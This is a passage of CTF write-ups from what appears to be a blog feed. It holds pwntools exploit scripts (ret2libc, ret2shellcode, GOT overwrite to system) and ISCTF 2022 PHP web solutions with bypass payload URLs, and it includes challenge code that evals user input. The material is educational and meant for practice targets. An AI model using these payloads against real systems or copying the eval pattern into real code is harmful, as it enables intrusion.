class="number">29946</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;answer?&#x27;</span>)</span><br><span class="line">    n = p.recvline().decode()</span><br><span class="line">    <span class="built_in">print</span>(n)</span><br><span class="line">    question = n.strip().split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;x&#x27;</span> <span class="keyword">in</span> question:</span><br><span class="line">        question = question.replace(<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">    answer = <span class="built_in">str</span>(<span class="built_in">eval</span>(question))</span><br><span class="line">    p.sendline(answer)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">  </span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28197</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">rdi = <span class="number">0x0000000000400753</span></span><br><span class="line">main = <span class="number">0x400698</span></span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">0x08</span>) + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">  </span><br><span class="line">puts_offset = <span class="number">0x84420</span></span><br><span class="line">execve = <span class="number">0xe3afe</span></span><br><span class="line">pop = <span class="number">0x000000000040074c</span></span><br><span class="line">  </span><br><span class="line">libc_addr = puts_addr - puts_offset</span><br><span class="line">execve_addr = libc_addr + execve</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">0x08</span>) + p64(pop) + p64(<span class="number">0</span>)*<span class="number">4</span> + p64(execve_addr)</span><br><span class="line">p.sendafter(<span class="string">&#x27;time?&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import * </span></span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">&#x27;./shell&#x27;</span></span><br><span class="line">local_libc  = <span class="string">&#x27;./libc-2.27.so&#x27;</span></span><br><span class="line">remote_libc = <span class="string">&#x27;./libc-2.27.so&#x27;</span></span><br><span class="line"><span class="comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span></span><br><span class="line">select = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> select == <span class="number">0</span>:</span><br><span class="line">    r = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25903</span> )</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line">elf = ELF(local_file)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)</span><br><span class="line"><span class="comment">#-----------------------------</span></span><br><span class="line">sla(<span class="string">&#x27;Hello my friend.Any gift for me?\n&#x27;</span>,asm(shellcraft.sh()))</span><br><span class="line">sla(<span class="string">&#x27;Anything else?\n&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x233000</span>))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="fallw1nd’s-gift"><a href="#fallw1nd’s-gift" class="headerlink" title="fallw1nd’s gift"></a>fallw1nd’s gift</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import * </span></span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">&#x27;./fallw1nd_gift&#x27;</span></span><br><span class="line">local_libc  = <span class="string">&#x27;./libc-2.31.so&#x27;</span></span><br><span class="line">remote_libc = <span class="string">&#x27;./libc-2.31.so&#x27;</span></span><br><span class="line"><span class="comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span></span><br><span class="line">select = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> select == <span class="number">0</span>:</span><br><span class="line">    r = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25419</span>)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line">elf = ELF(local_file)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line">se      = <span class="keyword">lambda</span> data               :r.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :r.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :r.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :r.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :r.recv(numb)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :r.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims                         :r.recvuntil(delims)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">info    = <span class="keyword">lambda</span> tag, addr        :r.info(tag + <span class="string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(addr))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">     gdb.attach(r,cmd)</span><br><span class="line"><span class="comment">#----------------------</span></span><br><span class="line">ru(<span class="string">&#x27;gift as reward:\n&#x27;</span>)</span><br><span class="line">puts_got=<span class="built_in">eval</span>(rc(<span class="number">14</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts_got)</span><br><span class="line">base=puts_got-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(base)</span><br><span class="line">system=base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc.sym[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">puts_plt=base+libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">sla(<span class="string">&#x27;now input your addr:\n&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="number">0x4033f8</span>)).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">se(p64(system))</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
            <tag> NewstartCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ISCTF 2022 Web-Writeup</title>
      <link href="/posts/cbb4.html"/>
      <url>/posts/cbb4.html</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="EASY-PHP01"><a href="#EASY-PHP01" class="headerlink" title="EASY-PHP01"></a>EASY-PHP01</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./flag114514.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hint&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ISCTF&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$ISCTF</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ISCTF&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$ISCTF</span> == <span class="number">114514</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$ISCTF</span> === <span class="string">&quot;114514&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;好臭啊&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;= == === != !==&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;什么是POST？&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot; 什么是GET？&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>php弱类型比较。传入ISCTF=114514a即可。</p><p>这里用到了PHP弱比较的知识</p><blockquote><p>== ：弱等于。在比较前会先把两种字符串类型转成相同的再进行比较。简单的说，它不会比较变量类型，只比较值。至于怎么转换后续会再赘述。<br>=== ：强等于。在比较前会先判断两种字符串类型是否相同再进行比较，如果类型不同直接返回不相等。既比较值也比较类型。</p></blockquote><h2 id="FakeWeb"><a href="#FakeWeb" class="headerlink" title="FakeWeb"></a>FakeWeb</h2><p>打开链接一看很快就重定向到别的网站了，抓包看看。</p><p><img src="https://s2.loli.net/2023/08/04/7YtpVsFUvSw2zAH.png" alt="image-20221105093638578.png"></p><p>看到一个奇怪的If-None-Match和ETag，补充下知识点：</p><p>ETag是HTTP1.1中才加入的一个属性，用来帮助服务器控制Web端的缓存验证。</p><blockquote><p>它的原理是这样的，当浏览器请求服务器的某项资源(A)时, 服务器根据A算出一个哈希值(3f80f-1b6-3e1cb03b)并通过 ETag返回给浏览器，浏览器把”3f80f-1b6-3e1cb03b” 和 A 同时缓存在本地，当下次再次向服务器请求A时，会通过类似 If-None-Match: “3f80f-1b6-3e1cb03b”的请求头把ETag发送给服务器，服务器再次计算A的哈希值并和浏览器返回的值做比较，如果发现A发生了变化就把A返回给浏览器(200)，如果发现A没有变化就给浏览器返回一个304未修改。这样通过控制浏览器端的缓存，可以节省服务器的带宽，因为服务器不需要每次都把全量数据返回给客户端。</p></blockquote><p>大概意思是比较If-None-Match和ETag，如果两者不相等则重新返回资源，否则不返回。</p><p>我们将If-None-Match修改之后再发包。就得到了flag。</p><p><img src="https://s2.loli.net/2023/08/04/uC483KqpvROMIE5.png" alt="image-20221105093946826.png"></p><p>应该是个非预期吧，在sitemap里能看到burp爬过的记录，里面也能看到flag。</p><h2 id="EASY-PHP02"><a href="#EASY-PHP02" class="headerlink" title="EASY-PHP02"></a>EASY-PHP02</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;need_time_to_change&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="variable">$YOUR_NAME</span> = <span class="variable">$_GET</span>[<span class="string">&quot;NAME&quot;</span>];</span><br><span class="line"><span class="variable">$GET1</span> = <span class="variable">$_POST</span>[<span class="string">&quot;GET1&quot;</span>];</span><br><span class="line"><span class="variable">$GET2</span> = <span class="variable">$_POST</span>[<span class="string">&quot;GET2&quot;</span>];</span><br><span class="line"><span class="variable">$POST1</span> = <span class="variable">$_GET</span>[<span class="string">&quot;P0ST1&quot;</span>];</span><br><span class="line"><span class="variable">$POST2</span> = <span class="variable">$_GET</span>[<span class="string">&quot;P0ST2&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$YOUR_NAME</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$YOUR_NAME</span>.<span class="string">&quot;,请开始你的答题。&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;做题前请告诉我你是小蓝鲨吗？&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$POST1</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;P0ST1&quot;</span>] != <span class="variable">$_GET</span>[<span class="string">&quot;P0ST2&quot;</span>])&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_GET</span>[<span class="string">&quot;P0ST1&quot;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&quot;P0ST2&quot;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$f1</span>=<span class="variable">$flag1</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;小蓝鲨成功一半&quot;</span>.<span class="variable">$f1</span>;              </span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[0-9]*$/&#x27;</span>,<span class="variable">$GET1</span>)) &#123;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$GET1</span> == <span class="number">0</span> )&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;前面的出来了吗？&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$GET2</span>))&#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$GET2</span> &gt; <span class="number">678</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;答案就在眼前？&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$YOUR_NAME</span>.<span class="string">&quot;,你觉得这是flag吗？&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;     </span><br><span class="line">            <span class="variable">$Ag</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$flag2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag666</span> = <span class="variable">$f1</span>.<span class="variable">$Ag</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag666</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第一层：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$POST1</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;P0ST1&quot;</span>] != <span class="variable">$_GET</span>[<span class="string">&quot;P0ST2&quot;</span>])&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_GET</span>[<span class="string">&quot;P0ST1&quot;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&quot;P0ST2&quot;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$f1</span>=<span class="variable">$flag1</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;小蓝鲨成功一半&quot;</span>.<span class="variable">$f1</span>;              </span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>POST1必须是数字，POST1和POST2不相等，但是他们的md5值要相等。</p><p>这里用到了PHP特性的知识，md5弱比较。</p><p>原理：</p><blockquote><p>在 php 中，当字符串 以0e开头时，会被 php 识别成科学计数法，会被认为是数字。</p></blockquote><p>Payload1：<code>http://120.79.18.34:20867/?NAME=1&amp;P0ST1=0e545993274517709034328855841020&amp;P0ST2=s878926199a</code></p><p>第二层</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[0-9]*$/&#x27;</span>,<span class="variable">$GET1</span>)) &#123;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$GET1</span> == <span class="number">0</span> )&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;前面的出来了吗？&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$GET2</span>))&#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$GET2</span> &gt; <span class="number">678</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;答案就在眼前？&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$YOUR_NAME</span>.<span class="string">&quot;,你觉得这是flag吗？&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;     </span><br><span class="line">            <span class="variable">$Ag</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$flag2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里要求$GET1不能为数字，而且$GET1又等于0，并且$GET2不能为数字，值大于678。</p><p>弱类型比较：</p><blockquote><p>php 中0 与任何字符串比较都为 true，因为字符串被强制转换（截断）后都成了 0。</p></blockquote><p>Payload2：<code>GET1=a&amp;GET2=6782s</code></p><p>前半段的flag要经过hex编码，后半段经过base64解码后可以得到一个unicode再解码即可。</p><p>ISCTF{4f759692-a911-4f11-bf22-ddaa305514c0}</p><h2 id="simplephp"><a href="#simplephp" class="headerlink" title="simplephp"></a>simplephp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ERROR);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&quot;#\\\\\\\\/Ilikeisctf#&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$str</span>,<span class="variable">$arr</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;good try!&quot;</span>;</span><br><span class="line">    <span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;come on!!!&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要求preg_match($pattern,$str,$arr)，就是pattern要在str内，注意#是界定符，所以这俩#都不能加。<code>str=\\\\\\\\/Ilikeisctf</code>。</p><p>num通过is_numeric的检测，并且不等于36，去空后依然不等于36，经过过滤方法后等于要36。</p><p>fuzz一下，exp.php</p><figure class="highlight php"><table><tr><td 